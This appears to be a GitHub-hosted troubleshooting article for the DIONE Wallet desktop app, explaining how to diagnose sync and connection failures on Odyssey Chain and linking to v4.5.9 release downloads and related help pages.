![DIONE Wallet](assets/banner-article.png)

# DIONE Wallet Not Syncing: What to Check First

<p align="center">When the chain does not answer</p>

<p align="center"><a href="https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-006971?style=for-the-badge&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white" alt="Windows"></a> <a href="https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-006971?style=for-the-badge&logo=apple&logoColor=white" alt="macOS"></a> <a href="https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-006971?style=for-the-badge&logo=linux&logoColor=white" alt="Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-66519E?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white&labelColor=1B1B1D" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`dione-wallet-v4.5.9.exe`](https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-66519E?style=flat-square&logo=apple&logoColor=white&labelColor=1B1B1D" alt="macOS"> | macOS 12 or later | [`dione-wallet-v4.5.9.dmg`](https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-66519E?style=flat-square&logo=linux&logoColor=white&labelColor=1B1B1D" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`dione-wallet-v4.5.9.zip`](https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.zip) |

</div>

All versions and checksums are on the [v4.5.9 release page](https://github.com/dione-protocol/dione-desktop-wallet/releases/tag/v4.5.9).

> [!WARNING]
> Only download from this GitHub release page. A mirror, a search advertisement or a file sent in a chat is not the project.

A wallet that will not sync is almost always a network-path problem or an out-of-date build, not lost funds. Install the current release, confirm the machine can reach Odyssey Chain, and check the address on the block explorer before assuming anything. The balance lives on the chain; the wallet only reads it.

## What "not syncing" actually looks like

Three different symptoms get called the same thing, and they have different causes. The first is a wallet stuck on a connecting state that never resolves. The second is a wallet that connects but shows a stale balance - the number does not move when a transaction confirms. The third is a wallet that opens normally with an empty history, as though the account were new.

Separating them takes one minute and one tab: open the block explorer and look up the address. If the explorer shows the balance and the wallet does not, the keys and funds are fine and the read path is the problem. If the explorer shows nothing either, the question is about the address, not the app.

## The check order

1. **Update first.** Install the current release from the releases page. Connection handling and price fallbacks have both changed across builds, and a build that is behind can fail to reconnect after a network interruption.
2. **Confirm the connection.** Try the explorer in the same browser. If the explorer will not load either, the problem is the machine's path to the network, not the wallet.
3. **Look at the network path.** A VPN, a corporate firewall, a DNS filter or a captive portal all break the connection in ways that look like a wallet fault. Turn the VPN off once and retry.
4. **Check the clock.** A system clock that is minutes off breaks signed requests. Set the machine to automatic time.
5. **Re-check the RPC.** If a custom endpoint was ever added, restore the default one.

Steps four and five are the ones people skip, and they account for a surprising share of "it will not sync" reports.

## Network path versus wallet state

Odyssey Chain is native in DIONE Wallet, so there is no network to add before it works: chain ID 153153, the native currency DIONE, and the explorer at odysseyscan.com for confirming anything. When the wallet says it is connecting, it is trying to reach that chain - a request that either leaves the machine or does not.

If requests leave the machine and still fail, the endpoint is the next suspect. The default RPC is the project's own node; a custom one added earlier may be slow, rate-limited or gone. Removing the custom network and letting the wallet use its default is the fastest way to tell the difference between "the chain is unreachable" and "this endpoint is unreachable". The mechanics of adding and removing networks are in [Add Another Network to DIONE Wallet](https://github.com/dione-protocol/keys-and-transfers/blob/main/add-another-network-to-dione-wallet.md).

## When it connects but the balance is stale

A stale balance with a working connection is a read or cache question. Two things fix it in practice: let the app resync after the update rather than leaving it in the background, and confirm on the explorer that the transaction you are waiting for actually confirmed. A transaction that is still pending cannot move a balance, and a transaction that failed moved nothing - [Fix a Stuck DIONE Wallet Transaction](https://github.com/dione-protocol/setup-and-troubleshooting/blob/main/fix-a-stuck-dione-wallet-transaction.md) covers the pending case, and [DIONE Wallet Transaction Failed: Read the Error, Then Act](https://github.com/dione-protocol/setup-and-troubleshooting/blob/main/dione-wallet-transaction-failed.md) the failed one.

A wallet that shows zero rather than stale is a separate article, because the causes are different: [DIONE Wallet Balance Shows Zero: Causes and Fixes](https://github.com/dione-protocol/setup-and-troubleshooting/blob/main/dione-wallet-balance-shows-zero.md).

## The states that look like a fault and are not

- **First run after install.** The initial sync takes longer than any later one, because the wallet has to fetch chain state it has never seen. Leaving it open until it settles is the correct response.
- **A restart after an update.** The app reconnects from scratch, which briefly looks like the old failure.
- **A machine waking from sleep.** The network connection is re-established a few seconds after the app, so the first screen after a wake can show a stale figure.

None of these needs an intervention beyond waiting a moment or updating the build.

## If it still will not sync

Collect three facts before asking for help: the build you are running, whether the explorer loads on the same machine, and whether the address shows the expected balance there. Those three answers separate a network problem from a display problem from an address problem, and they are the first things anyone competent will ask.

The support route is [Get Help From DIONE Wallet Support](https://github.com/dione-protocol/keys-and-transfers/blob/main/get-help-from-dione-wallet-support.md). It is worth saying plainly that support never initiates a direct message and never asks for a seed phrase; anyone who does is impersonating it, which [Spot a Fake DIONE Site or Support Scam](https://github.com/dione-protocol/keys-and-transfers/blob/main/spot-a-fake-dione-site.md) covers.

## Keep the install current

DIONE Wallet is actively maintained, and the current release is published on the releases page.

Because updates are signed and verified against a pinned key before applying, staying current is safe by design and is the first answer to a wallet that stops behaving: a build that is behind can drop its connection and stay dropped. Install from [the v4.5.9 release](https://github.com/dione-protocol/dione-desktop-wallet/releases/tag/v4.5.9) rather than working around a defect, and if the release you have is already current, the check order above is the next step.

## FAQ

### Why does DIONE Wallet keep saying connecting?

Usually the machine cannot reach Odyssey Chain: a VPN, firewall, DNS filter or a stale custom RPC endpoint. Confirm the explorer loads on the same machine, then let the wallet use its default network again.

### Does it need an internet connection?

Yes. The wallet is non-custodial and holds no copy of the chain, so every balance it shows is read from the network. Offline, it can open but cannot confirm anything.

### How do I change the RPC?

Add or remove a custom network in the app's network settings, and remove a custom endpoint to return to the default. A wrong or dead endpoint is a common cause of a wallet that connects to nothing.

### Is my balance lost if the wallet will not sync?

No. If the explorer shows the balance for your address, the funds are on-chain and the wallet is only failing to read them. Fix the read path, not the wallet.

A sync problem resolved is usually a build updated, a VPN switched off, or an endpoint restored - in that order of likelihood. If the wallet opens but the number is wrong rather than absent, start at [DIONE Wallet Balance Shows Zero: Causes and Fixes](https://github.com/dione-protocol/setup-and-troubleshooting/blob/main/dione-wallet-balance-shows-zero.md); if it opens and never finishes connecting, [DIONE Wallet Stuck on Connecting](https://github.com/dione-protocol/setup-and-troubleshooting/blob/main/dione-wallet-stuck-on-connecting.md) is the closer match. Both pages assume the current release from [the v4.5.9 release](https://github.com/dione-protocol/dione-desktop-wallet/releases/tag/v4.5.9) and both route back here for the network path.
